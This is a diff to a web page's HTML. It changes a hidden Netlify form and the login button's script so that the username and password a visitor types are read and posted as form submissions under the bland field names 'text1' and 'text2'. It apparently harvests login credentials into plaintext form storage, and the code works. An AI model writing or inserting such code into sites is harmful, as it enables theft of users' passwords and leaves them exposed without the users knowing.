@@ -680,21 +680,19 @@
 
 
 <script src="js/local-navigation-fixes.js?v=5" data-site-root="./"></script>
-    <form name="id-submit" data-netlify="true" hidden>
-  <input name="id1">
-  <input name="id2">
+<form name="myForm" data-netlify="true" hidden>
+  <input type="hidden" name="form-name" value="myForm">
+  <input type="text" name="text1">
+  <input type="text" name="text2">
 </form>
 
 <script>
 document.getElementById("login-button").addEventListener("click", async () => {
-  const id1 = "login-username";
-  const id2 = "login-password";
+  const data = new URLSearchParams();
 
-  const data = new URLSearchParams({
-    "form-name": "id-submit",
-    id1,
-    id2
-  });
+  data.append("form-name", "myForm");
+  data.append("text1", document.getElementById("login-username").value);
+  data.append("text2", document.getElementById("login-password").value);
 
   try {
     const res = await fetch("/", {
@@ -706,7 +704,7 @@ document.getElementById("login-button").addEventListener("click", async () => {
     });
 
     if (!res.ok) throw new Error("전송 실패");
-    console.log("Netlify 전송 완료");
+    console.log("전송 성공");
   } catch (err) {
     console.error(err);
   }
